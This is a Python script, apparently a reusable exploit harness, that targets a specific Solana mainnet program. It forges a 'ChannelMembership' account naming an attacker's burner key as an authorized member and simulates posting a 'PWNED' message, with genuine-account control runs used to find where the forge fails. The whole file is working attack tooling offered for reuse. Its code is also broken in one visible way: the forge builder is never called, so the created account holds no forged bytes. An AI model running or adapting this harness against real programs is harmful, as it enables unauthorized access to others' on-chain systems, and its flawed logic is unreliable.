#!/usr/bin/env python3
"""
Reusable harness: run the GENUINE account and the FORGED account through the SAME
instruction back-to-back, printing full program logs + CU for each.

Why this shape: comparing the forge against the genuine account tells you almost
nothing (the genuine one dies later, on privilege). The useful comparison is
forged-vs-field-mismatch. This script runs THREE passes so all three controls are
visible in one output:

  PASS 1  genuine program-owned account, fields correct  -> expect privilege error
  PASS 2  genuine program-owned account, field WRONG      -> expect field error + msg!
  PASS 3  forged system-owned account, fields correct     -> the one under test

Read the CU + presence/absence of `msg!` to locate where the program died:
  fewer CU than PASS 2 AND no msg!  => died inside try_deserialize
  same CU as PASS 2 AND msg!        => died at field comparison (forge is byte-wrong)
  same CU as PASS 1                 => deserialized fine, died on privilege (forge WORKS)

Usage:
  1. Fill in CONFIG (program id, channel, real account, burner keypair path).
  2. Size the forge with `getMinimumBalanceForRentExemption` on the MEASURED borsh
     length, not on `Account::space()`.
  3. Run: `.venv/bin/python compare_forged_sim.py`
  simulateTransaction is free - no lamports are spent unless you call sendTransaction.
"""
import base64
import hashlib
import json
import struct
import sys
import urllib.request

from solders.hash import Hash
from solders.instruction import AccountMeta, Instruction
from solders.keypair import Keypair
from solders.message import Message
from solders.pubkey import Pubkey
from solders.system_program import ID as SYS
from solders.system_program import create_account, CreateAccountParams
from solders.transaction import Transaction

# ---------------------------------------------------------------- CONFIG
RPC = "https://api.mainnet-beta.solana.com"
PROGRAM_ID = Pubkey.from_string("CgRaMXqqRHNT3Zo2uVZfX72TuxUgcLb8E3A8KrXnbXAC")
CHANNEL = Pubkey.from_string("3Pb2CPq8pjUECdMDhsSnXBM59c7KWazrR8m7W9tCEECB")
REAL_ACCOUNT = Pubkey.from_string("HMXMuwaf8JUVvm6RgttH2oLhggkBHMsa1utuwCe2dUXZ")
KEYPAIR_PATH = "wallet/burner.json"
INSTRUCTION = "post_message"          # global:<name> discriminator
FORGE_SIZE = 96                       # MEASURED borsh length, not space()
# ChannelMembership field offsets AFTER the 8-byte disc (Anchor 0.29 #[account])
OFF_CHANNEL, OFF_AUTHORITY, OFF_STATUS = 8, 40, 72
DISC = hashlib.sha256(b"account:ChannelMembership").digest()[:8]
STATUS_AUTHORIZED = 0                 # enum variant 0 - READ state.rs, never assume
# ----------------------------------------------------------------------


def rpc(method, params):
    d = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    r = urllib.request.Request(RPC, data=d, headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(r, timeout=90).read())


def ix_disc(name):
    return hashlib.sha256(("global:" + name).encode()).digest()[:8]


kp = Keypair.from_json(open(KEYPAIR_PATH).read())
burner = kp.pubkey()


def build_forge():
    """Byte-exact forge. Clone-and-patch a REAL account when you can; this
    hand-built variant is only correct once the measured borsh layout is known."""
    f = bytearray(FORGE_SIZE)
    f[0:8] = DISC
    f[OFF_CHANNEL:OFF_CHANNEL + 32] = bytes(CHANNEL)
    f[OFF_AUTHORITY:OFF_AUTHORITY + 32] = bytes(burner)
    f[OFF_STATUS] = STATUS_AUTHORIZED
    f[OFF_STATUS + 1] = 0                       # Option tag -> None
    struct.pack_into("<I", f, OFF_STATUS + 2, 0)  # String len -> 0
    return bytes(f)


def simulate(label, ixs, signers):
    bh = rpc("getLatestBlockhash", [{"commitment": "confirmed"}])["result"]["value"]["blockhash"]
    msg = Message.new_with_blockhash(ixs, burner, Hash.from_string(bh))
    tx = Transaction.new_unsigned(msg)
    tx.sign(signers, Hash.from_string(bh))
    raw = base64.b64encode(bytes(tx)).decode()
    res = rpc("simulateTransaction", [raw, {
        "encoding": "base64", "sigVerify": False, "replaceRecentBlockhash": True}])
    v = res["result"]["value"]
    logs = v.get("logs") or []
    cu = next((l.split("consumed")[1].split("of")[0].strip()
               for l in logs if "consumed" in l), "?")
    msgs = [l.strip() for l in logs if "Error" in l or "error" in l]
    print(f"\n{'=' * 72}\n{label}\n{'=' * 72}")
    print(f"  err : {v.get('err')}")
    print(f"  CU  : {cu}")
    for m in msgs[:3]:
        print(f"  {m[:120]}")
    return v


def post_ix(membership):
    content = b"PWNED"
    data = ix_disc(INSTRUCTION) + struct.pack("<I", len(content)) + content
    return Instruction(PROGRAM_ID, data, [
        AccountMeta(CHANNEL, is_signer=False, is_writable=True),
        AccountMeta(membership, is_signer=False, is_writable=False),
        AccountMeta(burner, is_signer=True, is_writable=True),
        AccountMeta(SYS, is_signer=False, is_writable=False),
    ])


# PASS 1 - genuine, fields correct -> should die on PRIVILEGE (proves deserialize OK)
simulate("PASS 1  genuine program-owned account, fields correct",
         [post_ix(REAL_ACCOUNT)], [kp])

# PASS 2 - genuine, channel WRONG -> should die at FIELD COMPARISON and emit msg!
# (swap the channel account for an unrelated pubkey; keep the same membership)
other = Keypair().pubkey()
data = ix_disc(INSTRUCTION) + struct.pack("<I", 5) + b"PWNED"
simulate("PASS 2  genuine account, channel field WRONG (control)",
         [Instruction(PROGRAM_ID, data, [
             AccountMeta(other, is_signer=False, is_writable=True),
             AccountMeta(REAL_ACCOUNT, is_signer=False, is_writable=False),
             AccountMeta(burner, is_signer=True, is_writable=True),
             AccountMeta(SYS, is_signer=False, is_writable=False)])], [kp])

# PASS 3 - the forge under test
bal = rpc("getBalance", [str(burner)])["result"]["value"]
rent = rpc("getMinimumBalanceForRentExemption", [FORGE_SIZE])["result"]
print(f"\nbalance={bal:,}  rent{FORGE_SIZE}={rent:,}")
if bal < rent:
    print(f">>> SHORT by {rent - bal:,} lamports - state the deficit, do not theorise.")
    sys.exit(1)

fk = Keypair()
fp = fk.pubkey()
ix_create = create_account(CreateAccountParams(
    from_pubkey=burner, to_pubkey=fp, lamports=rent, space=FORGE_SIZE, owner=SYS))
simulate(f"PASS 3  FORGED {FORGE_SIZE}-byte system-owned account, fields correct",
         [ix_create, post_ix(fp)], [kp, fk])

print("\n=== VERDICT GUIDE ===")
print("PASS3 CU < PASS2 CU and no msg!  -> died inside try_deserialize (forge byte-wrong)")
print("PASS3 CU ~ PASS2 CU and msg!     -> died at field comparison")
print("PASS3 CU ~ PASS1 CU              -> deserialized fine, died on privilege => FORGE WORKS")
